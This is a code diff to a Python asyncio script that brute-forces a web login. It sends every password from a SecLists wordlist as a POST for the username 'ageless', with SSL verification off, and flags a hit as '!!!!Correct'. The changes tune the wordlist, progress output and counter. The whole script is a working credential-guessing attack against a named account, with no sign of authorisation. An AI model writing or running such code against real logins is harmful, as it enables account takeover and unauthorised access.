@@ -4,7 +4,7 @@ import multiprocessing
 from aiohttp import ClientSession, TCPConnector
 
 variable = multiprocessing.Value('i', 0)
-fp = open('/home/andrew/SecLists/Passwords/10_million_password_list_top_1000000.txt')  # open file on read mode
+fp = open('/home/andrew/SecLists/Passwords/10_million_password_list_top_100000.txt')  # open file on read mode
 lines = fp.read().split("\n")  # create a list containing all lines
 fp.close()  # close file
 
@@ -32,13 +32,18 @@ async def lol():
 	conn = TCPConnector(verify_ssl=False)
 	async with ClientSession(connector=conn,loop=asyncio.get_event_loop()) as session:
 		tasks = []
+		i = 0
 		for password in lines:
+			i += 1
+			if i % 1000:
+				print("Appending tasks: {}/{}".format(i / 1000, total / 1000))
 			tasks.append(fetch(session, password))
 		return await asyncio.gather(*tasks)
 
 async def fetch(session, password):
 	try:
 		with async_timeout.timeout(10):
+			print("Scedule {}".format(password))
 			async with session.post(url, data={
 				"username": "ageless",
 				"password": password,
@@ -47,13 +52,14 @@ async def fetch(session, password):
 				"func": "auth",
 			}, headers=headers) as response:
 				result = await response.text()
-				variable.value = variable.value + 1
 				if 'Invalid password' in result:
 					print('Incorrect {}   {}/{}'.format(password, variable.value ,total))
 				else:
 					print('!!!!Correct {}   {}/{}'.format(password, variable.value, total))
 	except Exception as e:
 		print("Error {}    {}/{}".format(e, variable.value, total))
+	finally:
+		variable.value = variable.value + 1
 
 
 loop = asyncio.get_event_loop()
